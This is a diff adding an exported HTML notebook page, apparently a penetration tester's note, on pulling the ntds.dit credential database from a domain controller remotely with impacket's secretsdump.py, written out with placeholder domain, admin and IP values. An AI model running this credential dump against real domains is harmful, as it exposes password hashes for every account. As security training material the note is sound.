@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>recover ntds.dit with an attacker Linux machine</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>recover ntds.dit with an attacker Linux machine</h1><br/><br />To extract ntds.dit and SYSTEM file we do not have to be  necessarily in the active directory, so we can proceed also externally with Linux.<br /><div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali# python3 <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>impacket<span style="color:#ff9d00;font-weight:700">/</span>examples<span style="color:#ff9d00;font-weight:700">/</span>secretsdump.py -just-dc &lt;DOMAIN&gt;<span style="color:#ff9d00;font-weight:700">/</span>&lt;admin-user&gt;@&lt;IpDomainController&gt;</pre></div><br />    <a href=""><img src="images/1197-1.png" alt="images/1197-1.png" /></a></div>
+</body>
+</html>
